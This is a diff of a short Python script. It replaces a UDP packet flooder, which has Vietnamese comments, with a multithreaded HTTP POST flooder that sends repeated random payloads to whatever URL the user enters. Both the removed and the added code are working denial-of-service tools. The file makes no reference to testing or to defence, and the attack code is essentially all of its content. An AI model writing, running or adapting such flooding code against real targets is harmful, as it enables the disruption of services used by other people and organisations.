@@ -1,29 +1,30 @@
-import socket
+import requests
 import random
-import time
+import threading
 
-# Tạo socket UDP
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+url = input("Enter URL: ")
+num_threads = int(input("Enter number of threads: "))
+requests_per_thread = int(input("Enter number of requests per thread: "))
 
-# Nhập địa chỉ IP hoặc tên miền và cổng
-url = input("Nhập URL hoặc IP đích: ")
-port = int(input("Nhập cổng đích: "))
+def send_requests(thread_id):
+    for i in range(requests_per_thread):
+        try:
+            data = random._urandom(10) * 1000
+            response = requests.post(url, data=data)
+            print(f"Thread {thread_id}: Sent {i + 1}, Status Code: {response.status_code}", end='\r')
+        except Exception as e:
+            print(f"Thread {thread_id}: Error - {e}")
 
-# Chuyển đổi tên miền thành địa chỉ IP (nếu cần)
-try:
-    target_address = (socket.gethostbyname(url), port)
-except socket.error as e:
-    print(f"Lỗi khi phân giải URL: {e}")
-    exit(1)
+def main():
+    threads = []
 
-# Số lượng vòng lặp và kích thước gói tin
-num_messages = 1000
-chunk_size = 1024 * 1000  # Kích thước của mỗi gói tin (100 KB)
+    for i in range(num_threads):
+        thread = threading.Thread(target=send_requests, args=(i + 1,))
+        threads.append(thread)
+        thread.start()
 
-for i in range(num_messages):
-    data = random._urandom(chunk_size)
-    s.sendto(data, target_address)
-    print(f"Đã gửi: {i + 1}", end='\r')
+    for thread in threads:
+        thread.join()
 
-# Đóng socket
-s.close()
+if __name__ == "__main__":
+    main()
